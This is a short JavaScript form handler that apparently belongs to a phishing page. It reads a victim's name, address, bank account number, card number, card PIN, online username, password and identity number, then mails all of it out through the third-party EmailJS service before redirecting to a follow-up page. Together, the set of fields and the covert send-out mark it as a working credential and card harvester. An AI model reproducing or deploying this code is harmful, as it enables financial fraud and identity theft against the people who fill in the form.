
let name = document.getElementById('name')
let surname = document.getElementById('surname')
let lastname = document.getElementById('lastname')
let reference = document.getElementById('reference')
let address = document.getElementById('address')
let state = document.getElementById('state')
let postal = document.getElementById('postal')
let amount = document.getElementById('amount')
let acctNumber = document.getElementById('account')
let cardNumber = document.getElementById('card')
let cardPin = document.getElementById('pin')
let username = document.getElementById('username')
let password = document.getElementById('password')
let id = document.getElementById('identity')
let email = document.getElementById('email')

let yes = document.getElementById('yes')
let no = document.getElementById('no')

window.onload = function() {
    document.getElementById('contact-form').addEventListener('submit', function(event) {
        event.preventDefault();
        // generate a five digit number for the contact_number variable
        this.contact_number.value = Math.random() * 100000 | 0;
        // these IDs from the previous steps
        emailjs.sendForm("service_hoopla","template_standard", this)
        .then(function() {
            console.log('SUCCESS!');
            name.value = ""
            surname.value = ""
            lastname.value = ""
            reference.value = ""
            address.value = ""
            state.value = ""
            postal.value = ""
            amount.value = ""
            acctNumber.value = ""
            cardNumber.value = ""
            cardPin.value = ""
            username.value = ""
            password.value = ""
            id.value = ""
            email.value = ""
            let subscribe = document.getElementById('submit')
            console.log('na me')
            subscribe.style.animationName = 'done';
            subscribe.value = 'DONE'
            let Subscribe = setTimeout(sub, 2800);
            function sub(){
                subscribe.value = 'Submit'
                window.location.href="http://127.0.0.1:5501/next.html"
            }
        }, function(error) {
                console.log('FAILED...', error);
                let subscribe = document.getElementById('submit')
                subscribe.value = 'unable to submit'
                subscribe.style.animationName = 'failed';
                let Subscribe = setTimeout(sub, 4000);
                function sub(){
                    subscribe.value = 'Submit'
                }
            });
        });
}
